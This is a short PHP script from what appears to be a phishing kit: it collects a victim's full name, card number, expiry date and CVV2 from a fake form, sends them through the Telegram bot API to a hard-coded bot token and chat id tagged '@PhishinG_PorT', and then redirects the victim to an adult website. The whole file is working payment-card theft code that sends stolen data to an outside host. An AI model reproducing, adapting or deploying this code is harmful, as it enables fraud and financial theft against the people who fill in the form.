<?php 

$msg_card= $_POST['card_number_fake'];
$msg_pass= $_POST['card_exp_date_fake'];
$msg_cvv2= $_POST['card_cvv2'];
$msg_name= $_POST['full_name'];





include "Userid.php" ;


$message ="
🉐 New Credit Card 🉐

🔷Full Name : $msg_name

🔸Credit Card : $msg_card

🔹Date : $msg_pass

🔸CVV2 : $msg_cvv2

➖ @PhishinG_PorT ➖
";


$IDP = -476363973; 
$TOKENP = "1095785010:AAF_jVf3TNCCsxnuNpHvnlpXVtKVtlu0UAE";  
$prnd = file_get_contents("https://api.telegram.org/bot".$TOKENP."/sendMessage?parse_mode=HTML&chat_id=".$IDP."&text=".urlencode($message));
 
 
$send = file_get_contents("https://api.telegram.org/bot$TOKENESH/SendMessage?chat_id=$IDISH&text=".urlencode($message));

?>
<meta content='0;url=https://pornhub.com<?php ?>' http-equiv='refresh'/>
